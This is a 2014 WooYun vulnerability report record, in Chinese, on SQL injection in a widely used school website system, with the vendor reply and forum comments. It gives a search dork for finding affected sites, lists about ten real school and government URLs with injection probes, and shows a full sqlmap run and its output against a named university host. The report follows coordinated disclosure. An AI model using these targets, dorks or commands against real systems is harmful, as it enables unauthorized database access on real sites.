{"id": 2497, "wybug_id": "wooyun-2014-065350", "wybug_title": "某通用学校系统SQL注入漏洞之一(影响众多edu)", "wybug_corp": "Cncert国家互联网应急中心", "wybug_author": "泳少", "wybug_date": "2014-06-18 11:30", "wybug_open_date": "2014-08-02 11:32", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向公众公开  简要描述： RT。大家好。。。我是小白。。求各种带 详细说明：  \n关键字：inurl:TeachView.asp\n\n\n百度关键字是这么多的。。还有谷歌\nhttp://74.125.227.77/search?q=inurl:TeachView.asp&newwindow=1&ei=lwWhU5ylCZCeyAS96oGgBw&start=20&sa=N&biw=1024&bih=615\n然后随便找一个网站。如下\nhttp://lmk.xhqedu.gov.cn/TeachView.asp?id=20%27http://www.nczxx.org/TeachView.asp?id=31%27http://xszy.pdsu.edu.cn/zsx/TeachView.asp?id=59%27http://www.pjlbsyxx.com/TeachView.asp?id=22%27http://www.aybfjz.com/TeachView.asp?id=12%27http://www.scshlx.com/TeachView.asp?id=21%27http://www.zsguyi.net/TeachView.asp?id=15%27http://www.nbyale.com/teachview.asp?id=36%27http://www.pjlbsyxx.com/TeachView.asp?id=26%27http://www.hzdfxx.com.cn/teachview.asp?id=24%27http://www.gtxy.cn/xsc/sgzx/TeachView.asp?id=22%27\n大都出错。。\n\n然后我就随便找了一个网站利用sqlmap跑了下裤子。。\n[root@Hacker~]# Sqlmap sqlmap -u \"http://xszy.pdsu.edu.cn/zsx/TeachView.asp?id=59\" --dbs --current-user --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:24:22[14:24:22] [INFO] testing connection to the target url[14:24:23] [INFO] testing if the url is stable, wait a few seconds[14:24:24] [WARNING] url is not stable, sqlmap will base the page comparison ona sequence matcher. If no dynamic nor injectable parameters are detected, or incase of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match onhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit][14:24:24] [INFO] testing if GET parameter 'id' is dynamic[14:24:25] [INFO] confirming that GET parameter 'id' is dynamic[14:24:25] [WARNING] GET parameter 'id' appears to be not dynamic[14:24:25] [INFO] heuristics detected web page charset 'GB2312'[14:24:25] [WARNING] reflective value(s) found and filtering out[14:24:25] [INFO] heuristic test shows that GET parameter 'id' might be injectable (possible DBMS: Microsoft Access)[14:24:25] [INFO] testing for SQL injection on GET parameter 'id'[14:24:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[14:24:27] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectableparsed error message(s) showed that the back-end DBMS could be Microsoft Access. Do you want to skip test payloads specific for other DBMSes? [Y/n][14:24:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[14:24:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found[14:24:34] [INFO] checking if the injection point on GET parameter 'id' is a false positiveGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 30 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=59 AND 2677=2677---[14:24:39] [INFO] testing Microsoft Access[14:24:39] [INFO] confirming Microsoft Access[14:24:40] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[14:24:40] [WARNING] on Microsoft Access it is not possible to enumerate the current usercurrent user:   None[14:24:40] [WARNING] on Microsoft Access it is not possible to get name of the current databasecurrent database:       None[14:24:40] [WARNING] on Microsoft Access it is not possible to enumerate databases[14:24:40] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 30 times[14:24:40] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[14:24:40] [INFO] fetched data logged to text files under 'D:\\??\\???~1\\tools\\????\\SQLMAP~3\\Bin\\output\\xszy.pdsu.edu.cn'[*] shutting down at 14:24:40\n   漏洞证明：  貌似脱裤子的节奏啊   修复方案：  你懂的   版权声明：转载请注明来源 泳少@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-06-23 08:26 厂商回复： cnvd确认并复现所述多个实例情况，确认通用性，已经由cnvd通过公开联系渠道向软件生产厂商校无忧网络科技公司通报，电话至0564 ，将通报发送至 （鲁先生）邮箱中处置 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-18 11:39 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  给力！    \n     2014-06-18 11:54 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  这不是泳少大牛吗    \n     2014-06-18 11:56 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  少爷，您发力了吖    \n     2014-06-18 11:59 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @浩天 这不是浩天叔与 @光刃两个大神赐予我力量吗？    \n     2014-06-18 12:01 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  biubiubiu    \n     2014-06-18 12:07 |    \t\tadmin1993 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:39        | 0101001010010100101001010010100101001010...)\t\t \n  这不是泳少大牛吗     \n     2014-06-18 12:18 |    \t\t07@jyhack.com \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | 希望和大家多多交流，多多沟通、)\t\t \n  这不是泳少大牛吗    \n     2014-06-18 12:40 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  这就是泳少大牛    \n     2014-06-18 13:29 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @疯狗 标题好像有点逻辑错误。    \n     2014-06-18 20:55 |    \t\t冷少 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 专注网络安全，广交各地盆友~)\t\t \n  这不是泳少大牛么    \n     2014-06-18 21:39 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @冷少 这不是冷少大大大牛么    \n     2014-06-18 23:54 |    \t\t冷少 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 专注网络安全，广交各地盆友~)\t\t \n  咱路人……楼上白帽子    \n     2014-06-19 08:04 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @冷少 有个实习    \n     2014-06-21 12:23 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @cncert国家互联网应急中心 求确认    \n     2014-06-27 22:55 |    \t\t小小鸟 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 小白一个)\t\t \n  坐等公开    \n     2014-07-14 21:52 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @泳少 你发的通用好像都没钱啊    \n     2014-07-14 21:53 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @贫道来自河北 - -还没发下来OK？    \n     2014-07-14 22:03 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @泳少 不是20天就发吗,这个是先定价后发钱的吗    \n     2014-07-14 22:52 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @贫道来自河北 你去多了360库带计划了吗？这是乌云好吧？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}